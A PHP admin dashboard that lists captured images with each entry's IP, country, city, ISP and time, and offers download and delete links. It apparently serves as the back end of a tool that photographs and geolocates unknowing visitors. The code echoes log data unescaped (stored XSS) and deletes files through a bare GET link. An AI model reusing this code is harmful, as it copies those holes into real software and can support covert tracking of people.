<?php
session_start();

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header("Location: login.php");
    exit;
}

$dir = 'images/';
$images = [];

if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['file'])) {
    $file = basename($_GET['file']);
    $path = $dir . $file;

    if (file_exists($path)) {
        unlink($path);
    }

    if (file_exists("log.txt")) {
        $raw = file_get_contents("log.txt");
        $entries = explode("-----------------------------", $raw);
        $newLog = "";

        foreach ($entries as $entry) {
            if (strpos($entry, $file) === false) {
                if (trim($entry) != "") {
                    $newLog .= trim($entry) . "\n-----------------------------\n";
                }
            }
        }

        file_put_contents("log.txt", $newLog);
    }

    header("Location: dashboard.php");
    exit;
}

if (is_dir($dir)) {
    foreach (scandir($dir) as $file) {
        if ($file !== '.' && $file !== '..') {
            $images[$file] = [
                'name' => $file,
                'path' => $dir . $file,
                'date' => date("d M Y, H:i", filemtime($dir . $file))
            ];
        }
    }
}

$logs = [];
if (file_exists("log.txt")) {
    $raw = file_get_contents("log.txt");
    $entries = explode("-----------------------------", $raw);

    foreach ($entries as $entry) {
        if (trim($entry) == "") continue;

        $data = [];
        foreach (explode("\n", $entry) as $line) {
            if (strpos($line, ": ") !== false) {
                list($key, $val) = explode(": ", $line, 2);
                $data[$key] = $val;
            }
        }

        if (isset($data['Image'])) {
            $filename = basename($data['Image']);
            $data['file'] = $filename;
            $logs[] = $data;
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<title>Dashboard</title>

<style>
body {
    margin:0;
    font-family:Segoe UI;
    background:#f9fafb;
}

.header {
    background:#fff;
    padding:20px 30px;
    border-bottom:1px solid #e5e7eb;
    display:flex;
    justify-content:space-between;
}

.container {
    padding:30px;
}

.grid {
    display:grid;
    grid-template-columns:repeat(auto-fill,minmax(280px,1fr));
    gap:20px;
}

.card {
    background:#fff;
    border:1px solid #e5e7eb;
    border-radius:10px;
    overflow:hidden;
}

.card img {
    width:100%;
    height:200px;
    object-fit:cover;
}

.info {
    padding:15px;
    font-size:13px;
    color:#374151;
}

.info b {
    display:block;
    margin-top:5px;
    color:#111827;
}

.actions {
    display:flex;
    gap:10px;
    padding:15px;
}

.btn {
    flex:1;
    text-align:center;
    padding:8px;
    border-radius:6px;
    text-decoration:none;
    color:#fff;
    font-size:12px;
}

.download { background:#2563eb; }
.delete { background:#ef4444; }

</style>
</head>

<body>

<div class="header">
    <b>Admin Dashboard</b>
    <a href="logout.php">Logout</a>
</div>

<div class="container">

<div class="grid">

<?php foreach ($logs as $log): ?>
<div class="card">

<img src="images/<?= $log['file'] ?>">

<div class="info">
<b>IP:</b> <?= $log['IP'] ?? '-' ?>
<b>Negara:</b> <?= $log['Country'] ?? '-' ?>
<b>Kota:</b> <?= $log['City'] ?? '-' ?>
<b>ISP:</b> <?= $log['ISP'] ?? '-' ?>
<b>Waktu:</b> <?= $log['Time'] ?? '-' ?>
</div>

<div class="actions">
<a class="btn download" href="images/<?= $log['file'] ?>" download>Download</a>
<a class="btn delete" href="?action=delete&file=<?= $log['file'] ?>">Hapus</a>
</div>

</div>
<?php endforeach; ?>

</div>

</div>

</body>
</html>
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
?>